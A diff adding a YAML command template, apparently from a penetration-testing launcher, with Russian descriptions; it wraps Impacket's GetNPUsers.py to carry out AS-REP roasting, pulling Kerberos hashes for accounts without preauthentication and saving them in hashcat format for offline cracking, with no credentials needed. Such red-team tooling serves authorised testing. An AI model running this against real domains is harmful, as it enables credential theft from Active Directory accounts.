@@ -1,0 +1,26 @@
+description: ASREP roasting (не требует кред)
+author: vinzekatze
+tags:
+  - kerberos
+  - ASPREP roasting
+
+arguments:
+  domain:
+    description: домен
+  usersfile:
+    description: файл со списком пользователей
+  o:
+    default:
+      - asrep-hashes.txt
+    description: выходной файл с хешами
+    metavar: FILE
+
+mode:
+  format:
+    domain: '{!r}/'
+    usersfile: '{!r}'
+    o: '{!r}'
+
+shell: bash
+script: >-
+  GetNPUsers.py #domain# -usersfile #usersfile# -format hashcat -outputfile #o#
